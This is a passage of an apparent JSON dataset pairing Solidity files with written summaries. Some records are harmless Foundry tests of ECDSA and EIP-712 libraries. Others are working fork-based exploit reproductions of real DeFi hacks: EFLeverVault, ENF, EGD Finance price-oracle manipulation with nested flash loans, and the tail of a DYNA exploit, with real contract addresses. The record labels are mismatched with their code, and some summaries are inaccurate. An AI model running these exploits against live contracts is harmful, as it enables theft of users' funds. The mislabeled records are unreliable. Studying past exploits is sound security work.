++i){\n            uint256 amount = DYNA.balanceOf(address(this));\n            DYNA.transfer(address(StakingRewardList[i]), amount);\n            StakingRewardList[i].deposit(amount);\n            StakingRewardList[i].withdraw(amount);\n        }\n        DYNA.transfer(address(Pair), flashLoanAmount * 100000 / 9975 / 9 + 1000);\n    }\n\n    function DYNAToWBNB() internal {\n        DYNA.transfer(tx.origin, DYNA.balanceOf(address(this)));\n        cheats.startPrank(tx.origin);\n        DYNA.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(DYNA);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            DYNA.balanceOf(tx.origin), 0, path, address(this), block.timestamp\n        );\n        cheats.stopPrank();\n    }\n\n}",
        "summary": "This code defines a Solidity smart contract that is designed to exploit a vulnerability in a decentralized finance (DeFi) protocol running on the Binance Smart Chain (BSC). The vulnerability allows an attacker to bypass the limit on the maximum amount of a token that can be sold on the DeFi protocol. The exploit involves creating multiple instances of a staking reward contract, depositing tokens into each contract, then rapidly depositing and withdrawing tokens from each contract. The exploit also involves using a flash loan to manipulate the price of a token, and exchanging the token for another token using Uniswap. The code imports various interfaces and libraries that are needed to interact with the BSC and the DeFi protocol, and defines several functions that are used to execute the exploit.",
        "id": "2ca65d4c-ed43-4fb9-a90e-bc534c8b55a6",
        "api_seq": "ECDSA.t"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {VyperDeployer} from \"utils/VyperDeployer.sol\";\n\nimport {BytesLib} from \"solidity-bytes-utils/BytesLib.sol\";\n\nimport {IECDSA} from \"./interfaces/IECDSA.sol\";\n\n/**\n * @dev Error that occurs when the signature length is invalid.\n * @param emitter The contract that emits the error.\n */\nerror InvalidSignatureLength(address emitter);\n\n/**\n * @dev Error that occurs when the signature value 's' is invalid.\n * @param emitter The contract that emits the error.\n */\nerror InvalidSignatureSValue(address emitter);\n\ncontract ECDSATest is Test {\n    using BytesLib for bytes;\n\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n\n    // solhint-disable-next-line var-name-mixedcase\n    IECDSA private ECDSA;\n\n    address private self = address(this);\n    address private zeroAddress = address(0);\n    // solhint-disable-next-line var-name-mixedcase\n    address private ECDSAAddr;\n\n    /**\n     * @dev Transforms a standard signature into an EIP-2098\n     * compliant signature.\n     * @param signature The secp256k1 64/65-bytes signature.\n     * @return short The 64-bytes EIP-2098 compliant signature.\n     */\n    function to2098Format(\n        bytes memory signature\n    ) internal view returns (bytes memory) {\n        if (signature.length != 65) revert InvalidSignatureLength(self);\n        if (uint8(signature[32]) >> 7 == 1) revert InvalidSignatureSValue(self);\n        bytes memory short = signature.slice(0, 64);\n        uint8 parityBit = uint8(short[32]) | ((uint8(signature[64]) % 27) << 7);\n        short[32] = bytes1(parityBit);\n        return short;\n    }\n\n    function setUp() public {\n        ECDSA = IECDSA(vyperDeployer.deployContract(\"src/utils/\", \"ECDSA\"));\n        ECDSAAddr = address(ECDSA);\n    }\n\n    function testRecoverWithValidSignature() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertEq(alice, ECDSA.recover_sig(hash, signature));\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        bytes memory signature2098 = to2098Format(signature);\n        assertEq(alice, ECDSA.recover_sig(hash, signature2098));\n    }\n\n    function testRecoverWithTooShortSignature() public {\n        /**\n         * @dev Standard signature check.\n         */\n        bytes32 hash = keccak256(\"WAGMI\");\n        bytes memory signature = \"0x0123456789\";\n        assertEq(ECDSA.recover_sig(hash, signature), zeroAddress);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        vm.expectRevert(\n            abi.encodeWithSelector(InvalidSignatureLength.selector, self)\n        );\n        to2098Format(signature);\n    }\n\n    function testRecoverWithTooLongSignature() public {\n        /**\n         * @dev Standard signature check.\n         */\n        bytes32 hash = keccak256(\"WAGMI\");\n        bytes memory signature = bytes(\n            \"0x012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789\"\n        );\n        vm.expectRevert();\n        ECDSA.recover_sig(hash, signature);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        vm.expectRevert(\n            abi.encodeWithSelector(InvalidSignatureLength.selector, self)\n        );\n        to2098Format(signature);\n    }\n\n    function testRecoverWithArbitraryMessage() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = bytes32(\"0x5741474d49\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertEq(alice, ECDSA.recover_sig(hash, signature));\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        bytes memory signature2098 = to2098Format(signature);\n        assertEq(alice, ECDSA.recover_sig(hash, signature2098));\n    }\n\n    function testRecoverWithWrongMessage() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hashCorrect = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hashCorrect);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        bytes32 hashWrong = keccak256(\"WAGMI1\");\n        address recoveredAddress = ECDSA.recover_sig(hashWrong, signature);\n        assertTrue(alice != recoveredAddress);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        bytes memory signature2098 = to2098Format(signature);\n        assertTrue(alice != ECDSA.recover_sig(hashWrong, signature2098));\n    }\n\n    function testRecoverWithInvalidSignature() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signatureInvalid = abi.encodePacked(r, s, bytes1(0xa0));\n        vm.expectRevert(bytes(\"ECDSA: invalid signature\"));\n        ECDSA.recover_sig(hash, signatureInvalid);\n    }\n\n    function testRecoverWith0x00Value() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signatureWithoutVersion = abi.encodePacked(r, s);\n        bytes1 version = 0x00;\n        vm.expectRevert(bytes(\"ECDSA: invalid signature\"));\n        ECDSA.recover_sig(\n            hash,\n            abi.encodePacked(signatureWithoutVersion, version)\n        );\n    }\n\n    function testRecoverWithWrongVersion() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signatureWithoutVersion = abi.encodePacked(r, s);\n        bytes1 version = 0x02;\n        vm.expectRevert(bytes(\"ECDSA: invalid signature\"));\n        ECDSA.recover_sig(\n            hash,\n            abi.encodePacked(signatureWithoutVersion, version)\n        );\n    }\n\n    function testRecoverWithCorrectVersion() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (address alice, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signatureWithoutVersion = abi.encodePacked(r, s);\n        assertEq(\n            alice,\n            ECDSA.recover_sig(\n                hash,\n                abi.encodePacked(signatureWithoutVersion, v)\n            )\n        );\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        bytes memory signature2098 = to2098Format(\n            abi.encodePacked(signatureWithoutVersion, v)\n        );\n        assertEq(alice, ECDSA.recover_sig(hash, signature2098));\n    }\n\n    function testRecoverWithTooHighSValue() public {\n        /**\n         * @dev Standard signature check.\n         */\n        (, uint256 key) = makeAddrAndKey(\"alice\");\n        bytes32 hash = keccak256(\"WAGMI\");\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        uint256 sTooHigh = uint256(s) +\n            0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0;\n        bytes memory signature = abi.encodePacked(r, bytes32(sTooHigh), v);\n        vm.expectRevert(bytes(\"ECDSA: invalid signature 's' value\"));\n        ECDSA.recover_sig(hash, signature);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        vm.expectRevert(\n            abi.encodeWithSelector(InvalidSignatureSValue.selector, self)\n        );\n        to2098Format(signature);\n    }\n\n    function testEthSignedMessageHash() public {\n        bytes32 hash = keccak256(\"WAGMI\");\n        bytes32 digest1 = ECDSA.to_eth_signed_message_hash(hash);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testToTypedDataHash() public {\n        bytes32 domainSeparator = keccak256(\"WAGMI\");\n        bytes32 structHash = keccak256(\"GM\");\n        bytes32 digest1 = ECDSA.to_typed_data_hash(domainSeparator, structHash);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testToDataWithIntendedValidatorHash() public {\n        address validator = makeAddr(\"intendedValidator\");\n        bytes memory data = new bytes(42);\n        bytes32 digest1 = ECDSA.to_data_with_intended_validator_hash(\n            validator,\n            data\n        );\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19\\x00\", validator, data)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testToDataWithIntendedValidatorHashSelf() public {\n        bytes memory data = new bytes(42);\n        bytes32 digest1 = ECDSA.to_data_with_intended_validator_hash_self(data);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19\\x00\", ECDSAAddr, data)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testFuzzRecoverWithValidSignature(\n        string calldata signer,\n        string calldata message\n    ) public {\n        /**\n         * @dev Standard signature check.\n         */\n        (address alice, uint256 key) = makeAddrAndKey(signer);\n        bytes32 hash = keccak256(abi.encode(message));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hash);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        assertEq(alice, ECDSA.recover_sig(hash, signature));\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        bytes memory signature2098 = to2098Format(signature);\n        assertEq(alice, ECDSA.recover_sig(hash, signature2098));\n    }\n\n    function testFuzzRecoverWithWrongMessage(\n        string calldata signer,\n        string calldata message,\n        bytes32 digest\n    ) public {\n        /**\n         * @dev Standard signature check.\n         */\n        (address alice, uint256 key) = makeAddrAndKey(signer);\n        bytes32 hashCorrect = keccak256(abi.encode(message));\n        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, hashCorrect);\n        bytes memory signature = abi.encodePacked(r, s, v);\n        address recoveredAddress = ECDSA.recover_sig(digest, signature);\n        assertTrue(alice != recoveredAddress);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        bytes memory signature2098 = to2098Format(signature);\n        assertTrue(alice != ECDSA.recover_sig(digest, signature2098));\n    }\n\n    function testFuzzRecoverWithInvalidSignature(\n        bytes calldata signature,\n        string calldata message\n    ) public {\n        vm.assume(signature.length < 64);\n        /**\n         * @dev Standard signature check.\n         */\n        bytes32 hash = keccak256(abi.encode(message));\n        address recoveredAddress = ECDSA.recover_sig(hash, signature);\n        assertEq(recoveredAddress, zeroAddress);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        vm.expectRevert(\n            abi.encodeWithSelector(InvalidSignatureLength.selector, self)\n        );\n        to2098Format(signature);\n    }\n\n    function testFuzzRecoverWithTooLongSignature(\n        bytes calldata signature,\n        string calldata message\n    ) public {\n        vm.assume(signature.length > 65);\n        /**\n         * @dev Standard signature check.\n         */\n        bytes32 hash = keccak256(abi.encode(message));\n        vm.expectRevert();\n        ECDSA.recover_sig(hash, signature);\n\n        /**\n         * @dev EIP-2098 signature check.\n         */\n        vm.expectRevert(\n            abi.encodeWithSelector(InvalidSignatureLength.selector, self)\n        );\n        to2098Format(signature);\n    }\n\n    function testFuzzEthSignedMessageHash(string calldata message) public {\n        bytes32 hash = keccak256(abi.encode(message));\n        bytes32 digest1 = ECDSA.to_eth_signed_message_hash(hash);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", hash)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testFuzzToTypedDataHash(\n        string calldata domainSeparatorPlain,\n        string calldata structPlain\n    ) public {\n        bytes32 domainSeparator = keccak256(abi.encode(domainSeparatorPlain));\n        bytes32 structHash = keccak256(abi.encode(structPlain));\n        bytes32 digest1 = ECDSA.to_typed_data_hash(domainSeparator, structHash);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testFuzzToDataWithIntendedValidatorHash(\n        address validator,\n        bytes calldata data\n    ) public {\n        bytes32 digest1 = ECDSA.to_data_with_intended_validator_hash(\n            validator,\n            data\n        );\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19\\x00\", validator, data)\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testFuzzToDataWithIntendedValidatorHashSelf(\n        bytes calldata data\n    ) public {\n        bytes32 digest1 = ECDSA.to_data_with_intended_validator_hash_self(data);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\"\\x19\\x00\", ECDSAAddr, data)\n        );\n        assertEq(digest1, digest2);\n    }\n}\n",
        "summary": "This Solidity contract contains a collection of functions used to test and verify the functionality of the ECDSA (Elliptic Curve Digital Signature Algorithm) library. The contract includes functions to test signature recovery, transform signatures into EIP-2098 compliant signatures, and generate message hashes. There are also several \"fuzz\" functions that test the functionality of the implementation with various inputs.",
        "id": "913ca921-9ceb-4e34-8b3e-93a2cbe5a858",
        "api_seq": "EFLeverVault_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/Supremacy_CA/status/1581012823701786624\n// https://twitter.com/MevRefund/status/1580917351217627136\n// https://twitter.com/danielvf/status/1580936010556661761\n// @Attack tx\n// https://etherscan.io/tx/0x1f1aba5bef04b7026ae3cb1cb77987071a8aff9592e785dd99860566ccad83d1 frontrun bot\n// https://etherscan.io/tx/0x160c5950a01b88953648ba90ec0a29b0c5383e055d35a7835d905c53a3dda01e exploiter\n\ninterface EFLeverVault {\n    function deposit(uint256) payable external;\n    function withdraw(uint256) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\n    EFLeverVault Vault = EFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);\n    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    \n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15746199); \n    }\n\n    function testExploit() public {\n        \n        uint ETHBalanceBefore = address(this).balance;\n        // deposit\n        Vault.deposit{value: 1e17}(1e17);\n        // FlashLoan manipulate Contract balance\n        address [] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256 [] memory amounts = new uint256[](1);\n        amounts[0] = 1_000 * 1e18;\n        bytes memory userData = \"0x2\";\n\n        emit log_named_decimal_uint(\n            \"[Start] Before flashloan, ETH balance in EFLeverVault\",\n            address(Vault).balance,\n            18\n        );\n        balancer.flashLoan(address(Vault), tokens, amounts, userData);\n\n        emit log_named_decimal_uint(\n            \"[Start] After flashloan, ETH balance in EFLeverVault\",\n            address(Vault).balance,\n            18\n        );\n        Vault.withdraw(9e16);\n        /*\n      uint256 to_send = address(this).balance;  // vulnerable point, call flashloan first to make vault remain enough ETH.\n      (bool status, ) = msg.sender.call.value(to_send)(\"\");  //done\n        */\n\n        // ETH to WETH\n        uint256 ETHProfit = address(this).balance - ETHBalanceBefore;\n        address(WETH).call{value: ETHProfit}(abi.encodeWithSignature(\"deposit\"));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WETH balance after exploit\",\n            WETH.balanceOf(address(this)),\n            18\n        );\n    }\n\n    receive() payable external {}\n\n}\n",
        "summary": "This code defines a Solidity contract called `ContractTest`. It imports various Solidity interfaces and contracts, and defines a `setUp` function that initializes some variables. The key function is `testExploit`, which is meant to be an attack on the `EFLeverVault` contract. The attack involves depositing some ETH into the `EFLeverVault`, then using the Balancer `flashLoan` function to manipulate the balance of the `EFLeverVault` contract, and finally withdrawing some ETH/WETH as profit. However, it appears that the attack is incomplete since there is commented code at the end of the function that suggests another step is required but has been commented out. The purpose of this contract is unclear without more context.",
        "id": "e7a2d0f0-5bd7-4c65-93ac-4a4283552bcd",
        "api_seq": "EFVault_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1630490333716029440\n// https://twitter.com/drdr_zz/status/1630500170373685248\n// https://twitter.com/gbaleeeee/status/1630587522698080257\n// @TX\n// https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914\n\ninterface IENF is IERC20{\n    function redeem(uint256 shares, address receiver) external;\n}\n\ncontract ContractTest is Test {\n    IENF ENF = IENF(0xBDB515028A6fA6CD1634B5A9651184494aBfD336);\n    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n    address exploiter = 0x8B5A8333eC272c9Bca1E43F4d009E9B2FAd5EFc9;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16696239);\n    }\n\n    function testExploit() external {\n        deal(address(ENF), address(this), 1e18);\n        cheats.startPrank(address(this), address(this));\n        ENF.redeem(676562, exploiter);\n        cheats.stopPrank();\n\n        emit log_named_decimal_uint(\"Exploiter USDC balance after exploit\", USDC.balanceOf(exploiter), USDC.decimals());\n    }\n}",
        "summary": "This code defines a smart contract called \"ContractTest\" with two imported interfaces, \"Test\" and \"IENF\". Within the contract, it defines a function called \"testExploit\" that executes a transaction to exploit a vulnerability in an external contract called \"ENF\". It also imports a contract called \"CheatCodes\" to facilitate the exploitation. Once the exploit is successful, the function emits a log with the balance of USDC tokens owned by the attacker's address.",
        "id": "230302d3-efa0-4dde-af11-2b23ed818a84",
        "api_seq": "EGD-Finance.exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @KeyInfo - Total Lost : ~36,044 US$\n// Attacker : 0xee0221d76504aec40f63ad7e36855eebf5ea5edd\n// Attack Contract : 0xc30808d9373093fbfcec9e026457c6a9dab706a7\n// Vulnerable Contract : 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (Proxy)\n// Vulnerable Contract : 0x93c175439726797dcee24d08e4ac9164e88e7aee (Logic)\n// Attack Tx : https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3\n\n// @Info\n// Vulnerable Contract Code : https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee#code#F1#L254\n// Stake Tx : https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8\n\n// @Analysis\n// Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464\n// PeckShield : https://twitter.com/PeckShieldAlert/status/1556486817406283776\n\nIPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);\nIPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);\nIPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\naddress constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;\naddress constant usdt = 0x55d398326f99059fF775485246999027B3197955;\naddress constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;\n\ncontract Attacker is Test {\n    function setUp() public {\n        vm.createSelectFork(\"bsc\", 20_245_522);\n\n        vm.label(address(USDT_WBNB_LPPool), \"USDT_WBNB_LPPool\");\n        vm.label(address(EGD_USDT_LPPool), \"EGD_USDT_LPPool\");\n        vm.label(address(pancakeRouter), \"pancakeRouter\");\n        vm.label(EGD_Finance, \"EGD_Finance\");\n        vm.label(usdt, \"USDT\");\n        vm.label(egd, \"EGD\");\n    }\n\n    function testExploit() public {\n        Exploit exploit = new Exploit();\n\n        console.log(\"--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------\");\n        console.log(\"Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8\");\n        console.log(\"Attacker Stake 100 USDT to EGD Finance\");\n\n        exploit.stake();\n        vm.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)\n\n        console.log(\"-------------------------------- Start Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[Start] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[INFO] EGD/USDT Price before price manipulation\", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);\n        emit log_named_decimal_uint(\"[INFO] Current earned reward (EGD token)\", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);\n        console.log(\"Attacker manipulating price oracle of EGD Finance...\");\n\n        exploit.harvest();\n\n        console.log(\"-------------------------------- End Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n}\n\n/* Contract 0x93c175439726797dcee24d08e4ac9164e88e7aee */\ncontract Exploit is Test {\n    uint256 borrow1;\n    uint256 borrow2;\n\n    function stake() public {\n        // Give exploit contract 100 USDT\n        deal(address(usdt), address(this), 100 ether);\n        // Set invitor\n        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));\n        // Stake 100 USDT\n        IERC20(usdt).approve(EGD_Finance, 100 ether);\n        IEGD_Finance(EGD_Finance).stake(100 ether);\n    }\n\n    function harvest() public {\n        console.log(\"Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve\");\n        borrow1 = 2000 * 1e18;\n        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), \"0000\");\n        console.log(\"Flashloan[1] payback success\");\n        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT\n    }\n\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (keccak256(data) == keccak256(\"0000\")) {\n            console.log(\"Flashloan[1] received\");\n\n            console.log(\"Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve\");\n            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrow 99.99999925% USDT of EGD_USDT_LPPool reserve\n            EGD_USDT_LPPool.swap(0, borrow2, address(this), \"00\");\n            console.log(\"Flashloan[2] payback success\");\n\n            // Swap all egd -> usdt\n            console.log(\"Swap the profit...\");\n            address[] memory path = new address[](2);\n            path[0] = egd;\n            path[1] = usdt;\n            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);\n            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp\n            );\n\n            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 10e18); // Attacker payback 2,010 USDT (w/ 0.5% fee)\n            require(suc, \"Flashloan[1] payback failed\");\n        } else {\n            console.log(\"Flashloan[2] received\");\n            emit log_named_decimal_uint(\"[INFO] EGD/USDT Price after price manipulation\", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);\n            // -----------------------------------------------------------------\n            console.log(\"Claim all EGD Token reward from EGD Finance contract\");\n            IEGD_Finance(EGD_Finance).claimAllReward();\n            emit log_named_decimal_uint(\"[INFO] Get reward (EGD token)\", IERC20(egd).balanceOf(address(this)), 18);\n            // -----------------------------------------------------------------\n            uint256 swapfee = amount1 * 3 / 1000; // Attacker pay 0.3% fee to Pancakeswap\n            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);\n            require(suc, \"Flashloan[2] payback failed\");\n        }\n    }\n}\n/* -------------------- Interface -------------------- */\ninterface IEGD_Finance {\n    function bond(address invitor) external;\n    function stake(uint256 amount) external;\n    function calculateAll(address addr) external view returns (uint256);\n    function claimAllReward() external;\n    function getEGDPrice() external view returns (uint256);\n}",
        "summary": "This code is a Solidity smart contract that contains an attacker contract and a vulnerable contract. The attacker contract exploits a vulnerability in the vulnerable contract to manipulate the price oracle, borrow a large amount of USDT from liquidity pools, swap EGD for USDT, and pay back the USDT with a small fee. The vulnerable contract is a finance contract that allows users to stake USDT and earn EGD as a reward. The vulnerability in the contract allows an attacker to manipulate the price of EGD and borrow a large amount of USDT without collateral, causing a loss of funds for the finance contract.",
        "id": "7267d0a8-f2f0-4ba6-ab6b-0ffc57131b85",
        "api_seq": "EIP712DomainSeparator.t"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {VyperDeployer} from \"utils/VyperDeployer.sol\";\n\nimport {IEIP712DomainSeparator} from \"./interfaces/IEIP712DomainSeparator.sol\";\n\ncontract EIP712DomainSeparatorTest is Test {\n    string private constant _NAME = \"WAGMI\";\n    string private constant _VERSION = \"1\";\n    bytes32 private constant _TYPE_HASH =\n        keccak256(\n            bytes(\n                \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n            )\n        );\n    bytes32 private constant _PERMIT_TYPE_HASH =\n        keccak256(\n            bytes(\n                \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"\n            )\n        );\n\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n\n    // solhint-disable-next-line var-name-mixedcase\n    IEIP712DomainSeparator private EIP712domainSeparator;\n    // solhint-disable-next-line var-name-mixedcase\n    bytes32 private _CACHED_DOMAIN_SEPARATOR;\n\n    function setUp() public {\n        bytes memory args = abi.encode(_NAME, _VERSION);\n        EIP712domainSeparator = IEIP712DomainSeparator(\n            vyperDeployer.deployContract(\n                \"src/utils/\",\n                \"EIP712DomainSeparator\",\n                args\n            )\n        );\n        _CACHED_DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                _TYPE_HASH,\n                keccak256(bytes(_NAME)),\n                keccak256(bytes(_VERSION)),\n                block.chainid,\n                address(EIP712domainSeparator)\n            )\n        );\n    }\n\n    function testCachedDomainSeparatorV4() public {\n        assertEq(\n            EIP712domainSeparator.domain_separator_v4(),\n            _CACHED_DOMAIN_SEPARATOR\n        );\n    }\n\n    function testDomainSeparatorV4() public {\n        /**\n         * @dev We change the chain id here to access the \"else\" branch\n         * in the function `domain_separator_v4`.\n         */\n        vm.chainId(block.chainid + 1);\n        bytes32 digest = keccak256(\n            abi.encode(\n                _TYPE_HASH,\n                keccak256(bytes(_NAME)),\n                keccak256(bytes(_VERSION)),\n                block.chainid,\n                address(EIP712domainSeparator)\n            )\n        );\n        assertEq(EIP712domainSeparator.domain_separator_v4(), digest);\n    }\n\n    function testHashTypedDataV4() public {\n        address owner = makeAddr(\"owner\");\n        address spender = makeAddr(\"spender\");\n        uint256 value = 100;\n        uint256 nonce = 1;\n        // solhint-disable-next-line not-rely-on-time\n        uint256 deadline = block.timestamp + 100000;\n        bytes32 structHash = keccak256(\n            abi.encode(\n                _PERMIT_TYPE_HASH,\n                owner,\n                spender,\n                value,\n                nonce,\n                deadline\n            )\n        );\n        bytes32 digest1 = EIP712domainSeparator.hash_typed_data_v4(structHash);\n        bytes32 digest2 = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                EIP712domainSeparator.domain_separator_v4(),\n                structHash\n            )\n        );\n        assertEq(digest1, digest2);\n    }\n\n    function testFuzzDomainSeparatorV4(uint8 increment) public {\n        /**\n         * @dev We change the chain id here to access the \"else\" branch\n         * in the function `domain_separator_v4`.\n         */\n        vm.chainId(block.chainid + increment);\n        bytes32 digest = keccak256(\n            abi.encode(\n                _TYPE_HASH,\n                keccak256(bytes(_NAME)),\n                keccak256(bytes(_VERSION)),\n                block.chainid,\n                address(EIP712domainSeparator)\n            )\n        );\n        assertEq(EIP712domainSeparator.domain_separator_v4(), digest);\n    }\n\n    function testFuzzHashTypedDataV4(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 nonce,\n        uint64 increment\n    ) public {\n        // solhint-disable-next-line not-rely-on-time\n        uint256 deadline = block.timestamp + increment;\n        bytes32 structHash = keccak256(\n            abi.encode(\n                _PERMIT_TYPE_HASH,\n                owner,\n                spender,\n                value,\n                nonce,\n                deadline\n            )\n        );\n        